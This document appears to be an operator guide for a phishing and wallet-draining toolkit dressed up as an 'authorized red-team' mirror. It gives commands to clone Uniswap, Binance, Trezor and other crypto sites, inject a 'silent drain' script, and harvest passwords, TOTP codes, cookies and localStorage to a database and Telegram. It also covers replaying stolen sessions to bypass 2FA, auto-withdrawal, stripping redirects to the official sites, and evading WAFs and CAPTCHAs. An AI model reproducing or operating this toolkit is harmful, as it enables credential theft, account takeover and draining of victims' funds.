# God Mode Guide — Authorized Red-Team Mirror Toolkit

This guide covers end-to-end use of the Legion mirror + settlement stack for **authorized** security exercises only.

## Prerequisites

- Node 20+, pnpm, Docker Desktop
- `.env` configured (`DATABASE_URL`, `BACKEND_URL`, optional `CEX_CREDS_API_KEY`, `TWOCAPTCHA_API_KEY`)
- Tunnel providers: `CLONE_TUNNEL_PROVIDERS=localhost.run,bore,cloudflared`

## Quick Start (Any Target)

```bash
pnpm clone-tunnel --god-mode --force https://target.example.com
```

Stdout prints the public URL. The fallback chain runs automatically:

1. Reverse proxy (nginx + live data)
2. Static clone (fetch + local assets)
3. Headless capture (puppeteer + CAPTCHA solve)
4. Placeholder HTML (always serves something)

## Use Case: DEX / NFT (Uniswap, OpenSea)

**Mode:** Reverse proxy with live data.

```bash
pnpm clone-tunnel --god-mode --force https://app.uniswap.org
```

Features enabled:
- Subdomain passthrough (`/__legion_proxy/<host>/…`)
- 24h static asset cache (CSS, JS, images)
- WebSocket upgrade for live prices
- Silent drain inject + bot cloaking
- Login form capture → `POST /api/v1/creds`

**QA visible wallet panel:**

```bash
CLONE_MIRROR_QA_UI=true pnpm clone-tunnel --god-mode --force https://app.uniswap.org
```

**Validate locally:**

```bash
pnpm test-full-workflow --local-only --mirror-url http://127.0.0.1:8080
pnpm exec tsx scripts/mirror-qa-audit.ts http://127.0.0.1:8080
```

## Use Case: CEX (Binance, Coinbase, Kraken)

**Mode:** Credential capture + session replay (no trading UI clone required).

Auto-detection switches to CEX static login when the target hostname matches known exchanges:

```bash
pnpm clone-tunnel --force https://www.binance.com/login
# or explicit:
pnpm cex-clone https://www.binance.com/login ./clones/binance --deploy
```

Captured data: username, password, TOTP, `document.cookie`, `localStorage` → PostgreSQL + Telegram.

**Session replay (bypass 2FA with stolen session):**

```bash
pnpm session-replay --list
pnpm session-replay --export-db --id <uuid> --out capture.json --url https://www.binance.com --launch
```

Legacy CEX-specific replay:

```bash
pnpm cex-cookie-replay --id <uuid> --launch
```

**Experimental auto-withdraw (dry run only):**

```bash
pnpm cex-auto-withdraw --id <uuid> --dry-run
```

## Use Case: Hardware Wallet Web (Trezor Suite, Ledger Live Web)

**Mode:** Static clone with redirect stripping.

Redirects to the official site are automatically stripped for Trezor/Ledger hostnames. Force for any target:

```bash
STATIC_STRIP_REDIRECTS=true pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test --internal-authorized \
  https://suite.trezor.io ./clones/trezor
```

Drain script injects before `</body>`.

## Use Case: WAF-Protected Sites

When reverse proxy fails (Cloudflare, Turnstile), the fallback chain switches to headless capture:

```env
MIRROR_WAF_BYPASS=true
TWOCAPTCHA_API_KEY=...
LOCAL_CAPTCHA_SOLVER=true
HEADLESS_TIMEOUT=60000
HEADLESS_CAPTURE_RETRIES=2
```

Cookies are saved to `mirror-session-cookies.json` for nginx reuse via `MIRROR_PROXY_COOKIES`.

## Credential Capture (Any Login Form)

Enabled by default in `legion-authorized-drain.js` (`CAPTURE_LOGIN_CREDS=true`).

On form submit with password field:
- Username/email, password, TOTP extracted
- Cookies + localStorage captured
- `POST /api/v1/creds` → DB + Telegram (`CEX_TELEGRAM_ALERT=true`)

Disable: `CAPTURE_LOGIN_CREDS=false`

## Telegram Alerts

Every credential capture triggers a Telegram message when `CEX_TELEGRAM_ALERT=true` (default). Includes exchange, username, password, TOTP, cookies preview, localStorage preview, IP, User-Agent, page URL.

## Tunnel Fallback

Configure providers in order of reliability for your network:

```env
CLONE_TUNNEL_PROVIDERS=localhost.run,bore,cloudflared,ngrok,localtunnel
```

The orchestrator never exits without a public URL unless all methods including placeholder fail.

## Environment Reference

| Variable | Purpose |
|----------|---------|
| `CAPTURE_LOGIN_CREDS` | Hook login forms in drain inject |
| `CEX_CAPTURE_SESSION_COOKIES` | Capture cookies/localStorage |
| `CEX_TELEGRAM_ALERT` | Telegram on new creds |
| `CLONE_MIRROR_QA_UI` | Show wallet panel during QA |
| `STATIC_STRIP_REDIRECTS` | Strip redirects in static clones |
| `HEADLESS_CAPTURE_RETRIES` | Headless fallback retries (default 2) |

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Tunnel fails | Set `CLONE_TUNNEL_PROVIDERS=localhost.run,bore` |
| WAF challenge | Enable `MIRROR_WAF_BYPASS`, set `TWOCAPTCHA_API_KEY` |
| No drain inject | Check `/legion-authorized-drain.js` returns 200 |
| Bot cloak blocks health | Fixed — `/mirror-health` exempt |
| Slow SPA load | Warm cache — second load uses 24h nginx cache |
